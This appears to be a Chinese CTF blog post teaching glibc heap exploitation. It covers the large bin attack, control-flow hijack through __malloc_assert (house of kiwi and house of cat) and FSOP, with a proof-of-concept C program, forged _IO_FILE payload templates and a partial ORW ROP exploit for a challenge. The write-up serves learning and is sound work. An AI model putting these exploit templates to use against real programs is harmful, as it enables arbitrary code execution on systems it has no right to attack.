---
layout: post
title: "large bin attack及house of cat"
date:   2024-12-12
tags: [pwn, CTF]
comments: true
author: leakbox
---

&emsp;~~好不容易学点东西赶紧记下来, 不然过几天又忘记了~~

### 前情提要:<br>
##### &emsp;&emsp;&emsp;1. 由于glibc 2.34开始, 去掉了常用的各种hook, 包括__malloc_hook, __free_hook, __exit_hook等, 标志了一个时代的落幕. 从此之后, 在没有什么特别的backdoor的情况下, 仅仅使用tcachebin, unsortedbin, fastbin等的攻击很难达到劫持执行流的目的, 所以这些方法现在更多是作为一个泄露偏移的存在<br>
##### &emsp;&emsp;&emsp;2. 失去了hook不代表堆题就没法劫持控制流了(~~不然还玩个蛋~~), 还可以寻找其他劫持的方法. 劫持方法需要满足: 泛用性, 即大多数的情况下都存在的利用方法; 简易性, 在较少的漏洞利用的情况下就可以实现<br>
##### &emsp;&emsp;&emsp;3. 在现有的诸多劫持方法中, 可以总结出一些经验, 就是 largebinAttack + 某种house. 其中largebinAttack手法用于预备一个ROP(或者别的什么), 以及伪造一个IO_FILE_PLUS结构体, 然后由某种手法将控制流交给ROP

### 年轻人的第一个largebin attack
##### &emsp;&emsp;&emsp;对于一个chunk, 当被free的时候, 如果大小小于tcachebin的上限的话, 被放进对应的tcachebin内, 如果大于的话, 会被放到unsorted bin内. 显然, 我们现在讨论后者.<br>
##### &emsp;&emsp;&emsp; 放进unsorted bin的大chunk, 会在下一次malloc时被决定自己的命运. 当malloc无法在tcache和fastbin内找到合适的chunk(当前bins中的chunk都太小), 它会遍历unsorted bin<br>
##### &emsp;&emsp;&emsp; 假如malloc依然无法找到, 同时目标的large bin没有和附近的free chunk或者是top chunk合并, 那么它就会被原封不动的放到一个large bin内<BR>
##### &emsp;&emsp;&emsp;largebin具有和其他的bins不同的构造, 对于比较小的chunk, 每个chunk size都相对常用, 所以都有对应的bin. 但是large chunk本身就不常用, 具体落到每个chunk size更少, 所以glibc做法是一定chunk size内划分一个bin, 如图
```c
#include <stdlib.h>

void *p[0x10];

int main(){
    p[0] = malloc(0x390);
    malloc(0x18);
    p[1] = malloc(0x400);
    malloc(0x18);
    p[2] = malloc(0x410);
    malloc(0x18);
    p[3] = malloc(0x420);
    malloc(0x18);
    p[4] = malloc(0x430);
    malloc(0x18);
    p[5] =  malloc(0x440);
    malloc(0x18);
    p[6] = malloc(0x450);
    malloc(0x18);

    for(int i=0; i<7; ++i) free(p[i]);

    malloc(0x500);

    return 0;   
}
```
![Screenshot 2024-12-12 151434.png](https://www.helloimg.com/i/2024/12/12/675a8d7e437fb.png)
#####  &emsp;&emsp;&emsp;上面一行```0x400~0x430```虽然是这么写, 但实际上只有chunksize > 0x420, 也即```malloc(0x410)```以上才会放到largebin<br>
##### &emsp;&emsp;&emsp;一个largebin内chunksize是非升序排列的, 也就是从大到小的趋势 (图中从左向右, main_arena作为链表的尾) , 大小相同的紧挨着<br>
##### &emsp;&emsp;&emsp;largebin chunk内部的存放有管理这个链表的信息, ```fd, bk, fd_nextsize, bk_nextsize```, ```fd, bk```和其他bin没有区别, 连接着该bin中的所有chunk, 以及该bin所对应的```main_arena```<br>
##### &emsp;&emsp;&emsp;再看一个码, 大概意思就是一个chunksize有两个, 一个bin内一共6个
```c
#include <stdlib.h>

void *p[0x10];

int main(){
    p[0] = malloc(0x430);
    malloc(0x18);
    p[1] = malloc(0x430);
    malloc(0x18);
    p[2] = malloc(0x440);
    malloc(0x18);
    p[3] = malloc(0x440);
    malloc(0x18);
    p[4] = malloc(0x450);
    malloc(0x18);
    p[5] =  malloc(0x450);
    malloc(0x18);

    for(int i=0; i<6; ++i) free(p[i]);

    malloc(0x500);

    return 0;   
}
```
![Screenshot 2024-12-12 210547.png](https://www.helloimg.com/i/2024/12/12/675ae050022e3.png)
##### &emsp;&emsp;&emsp;给大🔥们画一个, 但是手太僵了
![扫描全能王 2024-12-12 21.02.jpg](https://www.helloimg.com/i/2024/12/12/675ae05088772.jpg)

##### &emsp;&emsp;&emsp;由```fd, bk```, 连接起了全部chunk和```main_arena```, 这也是gdb上展示的顺序<br>
##### &emsp;&emsp;&emsp;其次```fd_nextsize, bk_nextsize```, 只有每一组大小相同的chunks中的第一个才有这两个内容, 并且不连接```main_arena```<br>
##### &emsp;&emsp;&emsp;特别地, 当一个bin中只有两组不同大小的chunks时, 一个组的```fd_nextsize, bk_nextsize```都指向另一组(因为双向链表); 只有一组时, 这对指针都会指向自己

##### &emsp;&emsp;&emsp;```fd_nextsize, bk_nextsize```是专门用于管理同一个large bin中不同大小的chunk的排列的, 这一组指针和上一组不同, 并不会连接```main_arena```<br>
##### &emsp;&emsp;&emsp;large bin attack主要攻击的是```fd_nextsize, bk_nextsize```这一组指针

##### &emsp;&emsp;&emsp; 看一段glibc源码
```c

if ((unsigned long) size == (unsigned long) chunksize_nomask (fwd)){
    /* Always insert in the second position.  */
    /// 当存在一个chunk的size与victim一致
    fwd = fwd->fd;
else{
        victim->fd_nextsize = fwd;
        victim->bk_nextsize = fwd->bk_nextsize;
        if (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd))
            malloc_printerr ("malloc(): largebin double linked list corrupted (nextsize)");
        fwd->bk_nextsize = victim;
        victim->bk_nextsize->fd_nextsize = victim;
}
    bck = fwd->bk;
    if (bck->fd != fwd)
        malloc_printerr ("malloc(): largebin double linked list corrupted(bk)");
}

```
##### &emsp;&emsp;&emsp;有问题的语句在```victim->bk_nextsize = fwd->bk_nextsize```和```victim->bk_nextsize->fd_nextsize = victim;```, 即当找不到一个相同size的chunk, 目标victim必须生成一对```nextsize```, 来管理它自己size大小的large chunks, 问题在于缺少对于```fwd->bk_nextsize```的检查, 它实际上有可能被篡改为其他地址<br>
##### &emsp;&emsp;&emsp;现给出一个实现该large bin attack的最小利用
```c
#include <stdio.h>
#include <stdlib.h>

/// @note 假设我们需要将一个堆地址写到a[4]的位置

size_t a[6];

int main(){
    size_t *p1 = malloc(0x420);
    malloc(0x18);
    void *p2 = malloc(0x410);
    malloc(0x18);
    free(p1);

    malloc(0x440); // clear unsorted bins

    p1[3] = &a[0]; // largebin.bk_nextsize = target - 0x20

    free(p2);
    
    malloc(0x440); /* clear unsorted bins
                    * and trigger the attack
                    */
    return 0;
}
```
##### &emsp;&emsp;&emsp;```p1[3] = &a[0]```之后, ```bk_nextsize```变成了```&a[0]```的形状
![Screenshot 2024-12-12 214851.png](https://www.helloimg.com/i/2024/12/12/675aea0dc26bf.png)
##### &emsp;&emsp;&emsp;第二个```malloc(0x440)```之后, 触发了attack
![Screenshot 2024-12-12 214925.png](https://www.helloimg.com/i/2024/12/12/675aea0dcd486.png)
##### &emsp;&emsp;&emsp;检查```a[4]```, 发现确实篡改, 并且堆地址是
![Screenshot 2024-12-12 215003.png](https://www.helloimg.com/i/2024/12/12/675aea0dc1da0.png)
##### &emsp;&emsp;&emsp;具体发生了什么, 请看PNG
![扫描全能王 2024-12-12 22.11.jpg](https://www.helloimg.com/i/2024/12/12/675aef54cb20d.jpg)
##### &emsp;&emsp;&emsp;所以不难总结出部署一次largebin attack的方法:
##### &emsp;&emsp;&emsp;&emsp;1.准备一个chunk1, free掉, 它将作为之后源码中的```fwd```<br>&emsp;&emsp;&emsp;&emsp;2.申请一个比chunk1大的堆块, chunk1就被放在large bin中<br>&emsp;&emsp;&emsp;&emsp;3.UAF或者堆溢出, 修改chunk1的```bk_nextsize```为你指定的地址target的低0x10, 即```target - 0x20```<br>&emsp;&emsp;&emsp;&emsp;4.申请一个chunk2, 它比chunk1小, 但是应该被放在同一个bin, free它, 作为源码中的```victim```存在<br>&emsp;&emsp;&emsp;&emsp;5.重复2所做的事, 这会触发largebin attack, 并在```target```位置写上````victim````的chunkhead的地址

### __malloc_assert劫持控制流
#### &emsp;劫持路径
##### &emsp;&emsp;&emsp;```__malloc_assert```是一个用于判断堆分配请求是否合理的函数, 有许多方式来触发这个函数; <br>&emsp;&emsp;&emsp;选取其中最简单的方法, 使用某种手法来修改top chunk的chunksize位, 使得它小于之后要申请的chunk的大小, 注意这里与house of orange相反, 我们需要让修改后的 ```chunksize_nomask(size) + &chunk_head```不与内存页对齐, 从而触发异常. ```__malloc_assert```会尝试将错误信息输入到```stderr```<br>&emsp;&emsp;&emsp;这个输入的过程的调用过程如下
```c
__malloc_assert() --(assert false)--> __fxprintf ----> vfxprintf() ----> locked_vfxprintf() ----> __vfprintf_internal() ----> _IO_file_xsputn()
``` 
##### &emsp;&emsp;&emsp;一路到最后, 函数尝试调用了```_IO_file_xputsn()```, 而这个函数正好是通过```_IO_file_plus```结构体中的vtable加上偏移计算的, 这就给了我们篡改的机会,
[![Screenshot 2024-12-13 094514.png](https://www.helloimg.com/i/2024/12/13/675b91b714ab9.png)](https://www.helloimg.com/i/2024/12/13/675b91b714ab9.png)
##### &emsp;&emsp;&emsp;下面的```_IO_file_jumps```就是被查询的虚表, 关注在```__xsputn```下方0x10偏移处的```__seekoff```<br>
##### &emsp;&emsp;&emsp; 下面是seekoff的源码, 省去不重要的信息, 发现在return之前会调用```_IO_switch_to_wget_mode(fp)```, 这里的```fp```毫无疑问应该是```stderr```
```c
_IO_wfile_seekoff (FILE *fp, off64_t offset, int dir, int mode)
{
  off64_t result;
  off64_t delta, new_offset;
  long int count;

    ///@warning 这里的mode和下面的must_be_exact需要想办法绕过
  if (mode == 0)
    return do_ftell_wide (fp);

  int must_be_exact = ((fp->_wide_data->_IO_read_base
            == fp->_wide_data->_IO_read_end)
               && (fp->_wide_data->_IO_write_base
               == fp->_wide_data->_IO_write_ptr));

  bool was_writing = ((fp->_wide_data->_IO_write_ptr
		       > fp->_wide_data->_IO_write_base)
		      || _IO_in_put_mode (fp));


  if (was_writing && _IO_switch_to_wget_mode (fp))
    return WEOF;
......
}
```
##### &emsp;&emsp;&emsp;```_IO_switch_to_wget_mode```, 又到了```_IO_WOVERFLOW()```, 
```c
_IO_switch_to_wget_mode (FILE *fp)
{
  if (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base)
    if ((wint_t)_IO_WOVERFLOW (fp, WEOF) == WEOF)
      return EOF;
    ...
    ...
    ...
}
```
##### &emsp;&emsp;&emsp;```_IO_WOVERFLOW()```的汇编, 注意 +37 位置的call指令, 只要能够控制```rax```, 就可以劫持控制流了(finally!)
![Screenshot 2024-12-13 100413.png](https://www.helloimg.com/i/2024/12/13/675b9615d8209.png)
##### &emsp;&emsp;&emsp;现在需要知道```rax```在call之前是如何赋值的, 由于rdi始终没有变, 所以以rdi作为基准, ```rdx = rdi + 0xc0; rax = rdi + 0xa0 + 0xe0; rsi = 0xffffffff```, 根据blog https://xz.aliyun.com/t/13016?time__1311=GqmhBKYKGIqGx0HQ1DuWxgCWv2xTDpYD#toc-5, 这里的rdi实际上是一个堆地址<br>
##### &emsp;&emsp;&emsp;有一点不一样, 就是上面blog中的```_IO_WOVERFLOW()```的源码没有```mov esi, 0xffffffff```, (笔者glibc版本2.35), 所以在此情况之下, 实际上只能向call指令的函数传一个有效的参数(rdi). 对此, 可以使用```setcontext```这个gadget, 因为它主要使用rdx和偏移来设置其他寄存器, 而rdx是可以被控制的<br>
##### &emsp;&emsp;&emsp;总而言之, 需要将原本的stderr的地址修改为可控的一大块数据(通过largebin attack), 然后将其中的```_IO_file_jumps```虚表, 改为```该虚表 + 0x10 的值```, 然后触发```__malloc_assert```

#### &emsp; 伪造_IO_FILE结构体
##### &emsp;&emsp;&emsp;从上面的分析来看, 完成劫持需要制造错误的vtable偏移, 需要绕过mode, must_be_exact, was_writing的检查, 这些内容可以通过通过伪造一个假的_IO_FILE_complete结构体, 在把原本的stderr用这个假的替换, 即可满足<br>&emsp;&emsp;&emsp;所以这里有必要了解一下_IO_FILE等结构体的结构<br>
##### &emsp;&emsp;&emsp;首先是_IO_FILE结构体, 内容比较多, 但主要关注于前面8个指针, 它们和绕过检查有关<br>&emsp;&emsp;&emsp;中间的```_IO_backup_base```, 似乎一些手法可能会用得到, 但不是这里<br>&emsp;&emsp;&emsp;然后是```chain```结构体, 用来连接其他的结构体, 比如stderr会连接stdout(上文的图中)
```c
struct _IO_FILE
{
  int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */

  /* The following pointers correspond to the C++ streambuf protocol. */
  char *_IO_read_ptr;	/* Current read pointer */
  char *_IO_read_end;	/* End of get area. */
  char *_IO_read_base;	/* Start of putback+get area. */
  char *_IO_write_base;	/* Start of put area. */
  char *_IO_write_ptr;	/* Current put pointer. */
  char *_IO_write_end;	/* End of put area. */
  char *_IO_buf_base;	/* Start of reserve area. */
  char *_IO_buf_end;	/* End of reserve area. */

  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
  int _flags2;
  __off_t _old_offset; /* This used to be _offset but it's too small.  */

  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
```
##### &emsp;&emsp;&emsp;然后是```_IO_FILE_complete```结构体, 是```_IO_FILE```的加长版, 关注```_wide_data```指针, 和绕过检查有关系
```c
struct _IO_FILE_complete
{
  struct _IO_FILE _file;
#endif
  __off64_t _offset;
  /* Wide character stream stuff.  */
  struct _IO_codecvt *_codecvt;
  struct _IO_wide_data *_wide_data;
  struct _IO_FILE *_freeres_list;
  void *_freeres_buf;
  size_t __pad5;
  int _mode;
  /* Make sure we don't get into trouble again.  */
  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];
};
```
##### &emsp;&emsp;&emsp;```_IO_FILE_PLUS```结构体, 在```_IO_FILE```基础上加入一个vtable指针(虚表指针), 虚表指针中存放的是IO相关的操作函数<br>&emsp;&emsp;&emsp;其次, 注意上面源代码中的```#ifdef```宏定义, ```_IO_FILE_PLUS```中的```_IO_FILE```也可以指的是```_IO_FILE_COMPLETE```结构体
```c
struct _IO_FILE_plus
{
  _IO_FILE file;
  const struct _IO_jump_t *vtable;
};
```
##### &emsp;&emsp;&emsp;具体是那种结构, 猜测可能与使用的文件open函数有关, 但是没试过. 无论如何, 要伪造的stderr是```_IO_FILE_COMPLETE + vtable``` 的样式<br>&emsp;&emsp;&emsp;此外, 在libc中存在一个指向```_IO_FILE_plus```结构体的```_IO_list_all```指针, 通常情况下指向```_IO_2_1_stderr```, 然后stderr又通过chain指向stdout, stdout指向stdin<br>&emsp;&emsp;&emsp;当出现了新的文件描述符, 会插入到这个链表的头部<br>
##### &emsp;&emsp;&emsp;```_IO_jump_t```结构体, 有许多操作函数, 但是不同的```_IO_FILE_PLUS```, 可能会使用不同的虚表, stderr/stdout/stdin使用的是```_IO_file_jumps```
```c
struct _IO_jump_t
{
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
#if 0
    get_column;
    set_column;
#endif
};
```
##### &emsp;&emsp;&emsp;对于__malloc_assert的触发方法, 我们需要伪造stderr结构体, 以下是一个通用的模板(https://bbs.kanxue.com/thread-273895.htm#msg_header_h3_5)
```python
fake_io_addr=heapbase+0xb00 # 伪造的fake_IO结构体的地址
next_chain = 0
fake_IO_FILE=p64(rdi)         #_flags=rdi
fake_IO_FILE+=p64(0)*7
fake_IO_FILE +=p64(1)
fake_IO_FILE +=p64(2) #_IO_saveup_base rcx!=0(FSOP)
fake_IO_FILE +=p64(fake_io_addr+0xb0)#_IO_backup_base=rdx
fake_IO_FILE +=p64(call_addr)#_IO_save_end=call addr(call setcontext/system)
fake_IO_FILE = fake_IO_FILE.ljust(0x68, '\x00')
fake_IO_FILE += p64(0)  # _chain
fake_IO_FILE = fake_IO_FILE.ljust(0x88, '\x00')
fake_IO_FILE += p64(heapbase+0x1000)  # _lock = a writable address
fake_IO_FILE = fake_IO_FILE.ljust(0xa0, '\x00')
fake_IO_FILE +=p64(fake_io_addr+0x30)#_wide_data,rax1_addr
fake_IO_FILE = fake_IO_FILE.ljust(0xc0, '\x00')
fake_IO_FILE += p64(1) #mode=1
fake_IO_FILE = fake_IO_FILE.ljust(0xd8, '\x00')
fake_IO_FILE += p64(libcbase+0x2160c0+0x10)  # vtable=IO_wfile_jumps+0x10
fake_IO_FILE +=p64(0)*6
fake_IO_FILE += p64(fake_io_addr+0x40)  # rax2_addr
```
##### &emsp;&emsp;&emsp;更加具体的模板, 来自https://xz.aliyun.com/t/13016?time__1311=GqmhBKYKGIqGx0HQ1DunFG8YwpVDpYD
```c
fake_struct = p64(0)                    #_IO_read_end
fake_struct += p64(0)                   #_IO_read_base
fake_struct += p64(0)                   #_IO_write_base
fake_struct += p64(0)                   #_IO_write_ptr
fake_struct += p64(0)                   #_IO_write_end
fake_struct += p64(0)                   #_IO_buf_base
fake_struct += p64(1)                   #_IO_buf_end
fake_struct += p64(0)                   #_IO_save_base
fake_struct += p64(fake_io_addr + 0xb0) #_IO_backup_base = rdx
fake_struct += p64(call_addr)           #_IO_save_end = call_addr
fake_struct += p64(0)                   #_markers
fake_struct += p64(0)                   #_chain
fake_struct += p64(0)                   #_fileno
fake_struct += p64(0)                   #_old_offset
fake_struct += p64(0)                   #_cur_column
fake_struct += p64(heap_base + 0x200)   #_lock = heap_addr or writeable libc_addr
fake_struct += p64(0)                   #_offset
fake_struct += p64(0)                   #_codecvx
fake_struct += p64(fake_io_addr + 0x30) #_wide_data rax1
fake_struct += p64(0)                   #_freers_list
fake_struct += p64(0)                   #_freers_buf
fake_struct += p64(0)                   #__pad5
fake_struct += p32(0)                   #_mode
fake_struct += b"\x00"*20               #_unused2
fake_struct += p64(_IO_wfile_jumps + 0x10) #vtable
fake_struct += p64(0)*6                 #padding
fake_struct += p64(fake_io_addr + 0x40) #rax2

payload = fake_struct + p64(0)*7 + p64(rop_addr) + p64(ret)
```
##### &emsp;&emsp;&emsp;在具体使用时, 需要更改```fake_io_addr```为伪造的fake_IO的堆的地址, _IO_save_end为要调用的函数(即call_addr), _IO_backup_base为执行函数时的rdx, 以及修改_flags(即rdi)为执行函数时的rdi<br>
##### &emsp;&emsp;&emsp;

#### &emsp; __malloc_assert举例
##### &emsp;&emsp;&emsp;这里以那道著名的 ```house of cat``` 举例, 但是只关注largebin的部分, 绕过沙箱的部分忽略.<br> &emsp;&emsp;&emsp;使用了```__malloc_assert```触发orw的方法<br>&emsp;&emsp;&emsp;
##### &emsp;&emsp;&emsp;第一步是要先泄露出libc和heap基址, 这部分省略, 请各显神通<br>
##### &emsp;&emsp;&emsp;第二步是伪造一个_IO_FILE_PLUS结构, 用于绕过检查以及劫持虚表<br>
##### &emsp;&emsp;&emsp;第三步是通过largebin attack将stderr使用伪造的结构体替换, <br>
##### &emsp;&emsp;&emsp;第四步, 弄一个ROP或者是ORW之类的, 和二三步顺序可以互换<br>
##### &emsp;&emsp;&emsp;第五步, 想办法触发__malloc_assert, 常用的办法是修改top chunk size<br>
##### &emsp;&emsp;&emsp;模板中的```call_addr```修改为```setcontext+61```, 并在```rop_addr```指示的堆地址填入需要的rop链

##### &emsp;&emsp;&emsp;完整exp可以看https://xz.aliyun.com/t/13016?time__1311=GqmhBKYKGIqGx0HQ1DunFG8YwpVDpYD, 这里对伪造的部分做更具体地解释<br>
##### &emsp;&emsp;&emsp;
```python
...
free(0) # fwd
...
# fake io struct
payload = fake_struct + p64(0)*7 + p64(rop_addr) + p64(ret)

free(2) # addr(2) = addr(4) , 疑似是为了方便计算偏移
add(4,0x418,payload) 
free(4) # victim

# largebin attack(fake stderr struct)
edit(0,p64(libc_base+0x21a0d0)*2 + p64(heap_base+0x290) + p64(stderr-0x20))

# 触发第一次largebin attack(add(5)), 同时为后面一次分配堆(add(5), add(7))
add(5,0x440,"55555")
add(6,0x430,"./flag")
add(7,0x430,"77777")

rop = p64(pop_rdi) + p64(0) + p64(close) #close(0)
rop += p64(pop_rdi) + p64(flag_addr) + p64(pop_rax) + p64(2) + p64(syscall_ret) #open(flag)
rop += p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(flag_addr+0x10) + p64(pop_rdx_r12) + p64(0x100) + p64(0) + p64(read) #read(0,flag_addr+0x10,0x100)
rop += p64(pop_rdi) + p64(flag_addr+0x10) + p64(puts) #puts(flag_addr+0x10)

# 第二次largebin attack
add(8,0x430,rop) # +0x2040 +0x2050
free(5)
add(9,0x450,"9999")
free(7)
edit(5,p64(libc_base + 0x21a0e0)*2 + p64(heap_base + 0x1370) + p64(heap_base + 0x28e0-0x20 + 3))
```
##### &emsp;&emsp;&emsp;有几点细节需要注意.<br>
##### &emsp;&emsp;&emsp;第一, 这套基于```__malloc_assert```的打法在现在更高版本的glibc中已经不复存在了, 因为```__malloc_assert```被删除了, 但是largebin attack的其他方法, 比如FSOP依然可以<br>
##### &emsp;&emsp;&emsp;第二, stderr结构体指针有时不在libc中, 而是在```.bss```段中. 出现这种情况一般是使用了```setvbuf()```, 而不是```setbuf()```或者不使用. 这是因为```setvbuf()```会在源文件中使用三个```extern```变量指针, 在链接时被ld放入```.bss```段; 而```setbuf()```使用的三个指针放在```.got```内作为外部链接<br>
##### &emsp;&emsp;&emsp;第三, 由于largebin attack写入的是chunk head的地址, 再加上前4个字长的large bin的信息, 所以导致将这个堆块看作一个IO_FILE_PLUS时, 它的_flag(前8字节), 以及_IO_read_ptr, _IO_read_end, _IO_read_base, _IO_write_base, _IO_write_ptr(各八个字节)实际上是难以控制的, 除非有heap overflow或者UAF之类漏洞, *但是即使这样也不会影响这种攻击方法的使用*.

### &emsp;FSOP
##### &emsp;&emsp;&emsp;一个比较古老的漏洞，但是进入“虚表偏移时代”之后FSOP的形式出现了一些不同<br>
##### &emsp;&emsp;&emsp;FSOP利用的两个部分，第一是它的调用链，第二是触发FSOP
#### &emsp;触发IO
##### &emsp;&emsp;&emsp;在伪造了相应结构之后, 想要进行FSOP, 让伪造数据被用上, 需要先进入IO流, 在高版本的glibc中, 一般有两种方式进入IO流: ```_IO_flush_all_lockp()```, 以及```house of kiwi```方法, ```house of kiwi```方法就是上面的```__malloc_assert```方法.
#### &emsp;_IO_flush_all_lockp()方法
##### &emsp;&emsp;&emsp;这种方法是FSOP的传统做法, ```_IO_flush_all_lockp()```会从```_IO_list_all```查找```IO_FILE```结构体, 然后分别对每个结构体flush, 这个过程中会使用虚表中的```_IO_overflow```<br>
##### &emsp;&emsp;&emsp;触发这个函数又有一些办法, 但是在高版本glibc中砍得七七八八, 基本只剩下程序使用```exit()```退出这一种比较常见又方便利用的方法<br>
##### &emsp;&emsp;&emsp;精简代码
```c
int _IO_flush_all_lockp (int do_lock){
  ...
  fp = (_IO_FILE *) _IO_list_all;
  while (fp != NULL)
  {
       ...
    if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
       || (_IO_vtable_offset (fp) == 0
           && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
                    > fp->_wide_data->_IO_write_base))
#endif
       )
      && _IO_OVERFLOW (fp, EOF) == EOF)
           {
               result = EOF;
          }
        ...
  }
}
```
##### &emsp;&emsp;&emsp;其中```_IO_OVERFLOW```会使用虚表中```0x18```处的函数, 这就给我们可乘之机<br>
##### &emsp;&emsp;&emsp;为了避免短路, 想要执行到```_IO_OVERFLOW```, 有两种选择条件:
##### &emsp;&emsp;&emsp;第一种:
##### &emsp;&emsp;&emsp;&emsp;1. ```fp->_mode <= 0```
##### &emsp;&emsp;&emsp;&emsp;2. ```fp->_IO_write_ptr > fp->_IO_write_base``` 
##### &emsp;&emsp;&emsp;第二种:
##### &emsp;&emsp;&emsp;&emsp;1.``` _IO_vtable_offset(fp) == 0```
##### &emsp;&emsp;&emsp;&emsp;2.```fp->_mode > 0```
##### &emsp;&emsp;&emsp;&emsp;3. ```fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base```
##### &emsp;&emsp;&emsp;但是在使用largebin attack的情况下, 第一种情况很难满足, 因为```_IO_write_ptr```和```_IO_write_base```在chunk中的位置是fd_nextsize和bk_nextsize的位置.<br>
##### &emsp;&emsp;&emsp;所以一般是第二种实现起来更方便<br>
##### &emsp;&emsp;&emsp;至于之前使用的模板, 只需要把伪造的```vtable + 0x10``` 改成 ```vtabel + 0x30```即可<br>